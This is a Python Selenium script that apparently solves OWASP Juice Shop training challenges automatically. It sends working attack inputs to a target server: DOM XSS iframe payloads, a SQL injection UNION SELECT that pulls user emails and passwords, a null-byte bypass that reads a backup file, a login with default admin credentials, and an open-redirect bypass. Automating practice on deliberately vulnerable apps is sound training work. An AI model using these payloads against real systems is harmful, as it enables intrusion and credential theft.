from time import sleep

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager


def get_browser():
    return webdriver.Chrome(service=Service(ChromeDriverManager().install()))


def open_dom_xss_alert(server, browser):
    print('Popping DOM XSS in browser...', end=''),
    url = '{}/#/search?q=<iframe%20src%3D"javascript:alert(%60xss%60)">.'.format(server)
    browser.get(url)
    # Sleep just to show the XSS alert
    sleep(3)
    browser.switch_to.alert.accept()
    print('Success.')

def bonus_xss_payload(server, browser):
    print('Bonus XSS Payload...', end=''),
    url = '{}/#/search?q=<iframe%20width%3D"100%25"%20height%3D"166"%20scrolling%3D"no"%20frameborder%3D"no"%20allow%3D"autoplay"%20src%3D"https:%2F%2Fw.soundcloud.com%2Fplayer%2F%3Furl%3Dhttps%253A%2F%2Fapi.soundcloud.com%2Ftracks%2F771984076%26color%3D%2523ff5500%26auto_play%3Dtrue%26hide_related%3Dfalse%26show_comments%3Dtrue%26show_user%3Dtrue%26show_reposts%3Dfalse%26show_teaser%3Dtrue"><%2Fiframe>.'.format(server)
    browser.get(url)
    # Sleep just to show the XSS alert
    sleep(5)
    print('Success.')

def directory_listing(server, browser):
    print('Opening an Confidential document...', end=''),
    url = '{}/ftp/acquisitions.md'.format(server)
    browser.get(url)
    sleep(3)
    print('Success.')

def error_handlind(server, browser):
    print('Error handling...', end=''),
    url = '{}/ftp/coupons_2013.md.bak?md_debug=.md'.format(server)
    browser.get(url)
    sleep(3)
    print('Success.')

def privacy_policy(server, browser):
    print('Error handling...', end=''),
    url = '{}/#/privacy-security/privacy-policy'.format(server)
    browser.get(url)
    sleep(3)
    print('Success.')

def dev_backup_null_byte(server, browser):
    print('Forgottent Dev Backup & Null Byte Challange...', end=''),
    url = '{}/ftp/package.json.bak%2500.md'.format(server)
    browser.get(url)
    sleep(3)
    print('Success.')

def union_select(server, browser):
    print('Injection UNION SELECT...', end=''),
    url = '{}/rest/products/search?q=test%27))%20UNION%20SELECT%20id,email,password,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20USERS--'.format(server)
    browser.get(url)
    sleep(3)
    print('Success.')

def access_administration_site(server, browser):
    login = "admin@juice-sh.op"
    password = "admin123"
    print('Accessing administration site...', end=''),
    browser.get('{}/'.format(server))
    sleep(1)
    browser.get('{}/#/login'.format(server))
    sleep(2)
    browser.find_element(by=By.NAME, value="email").send_keys(login)
    browser.find_element(by=By.NAME, value="password").send_keys(password)
    sleep(1)
    browser.find_element(by=By.ID, value="loginButton").click()
    sleep(1)
    browser.get('{}/#/administration'.format(server))
    sleep(3)
    print('Success.')

def travel_back_in_time(server, browser):
    print('Travelling back to the glorious days of Geocities...', end=''),
    browser.get('{}/#/score-board'.format(server))
    browser.execute_script("$('#theme').attr('href', '/css/geo-bootstrap/swatch/bootstrap.css')")
    # Savour the best of themes.
    sleep(3)
    browser.refresh()
    print('Success.')

def redirect_whitelist(server, browser):
    print('Redirect...', end=''),
    browser.get('{}/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop'.format(server))
    print('Success.')

def take_screenshot_of_score_and_quit(server, browser):
    print('Score board...', end=''),
    browser.get('{}/#/score-board'.format(server))
    # with open('complete.png', 'wb') as outfile:
    #     outfile.write(browser.get_screenshot_as_png())
    # print('complete.png saved successfully.')
    print('Success.')
    browser.quit()


def solve_browser_challenges(server):
    print('\n== BROWSER CHALLENGES ==\n')
    try:
        browser = get_browser()
    except Exception as err:
        print('Unknown Selenium exception. Have you added the Chromedriver to your PATH?\n{}'.format(repr(err)))
        return
    try:
      open_dom_xss_alert(server, browser)
    except:
      print('open_dom_xss_alert - FAILED')
    try:
      bonus_xss_payload(server, browser)
    except:
      print('bonus_xss_payload - FAILED')
    try:
      access_administration_site(server, browser)
    except:
      print('access_administration_site - FAILED')
    try:
      privacy_policy(server, browser)
    except:
      print('privacy_policy - FAILED')
    try:
      redirect_whitelist(server, browser)
    except:
      print('redirect_whitelist - FAILED')
    try:
      take_screenshot_of_score_and_quit(server, browser)
    except:
      print('take_screenshot_of_score_and_quit - FAILED')
    print('\n== BROWSER CHALLENGES COMPLETE ==\n')

    # The same challanges solved in browser
    # directory_listing(server, browser)
    # error_handlind(server, browser)
    # dev_backup_null_byte(server, browser)
    # union_select(server, browser)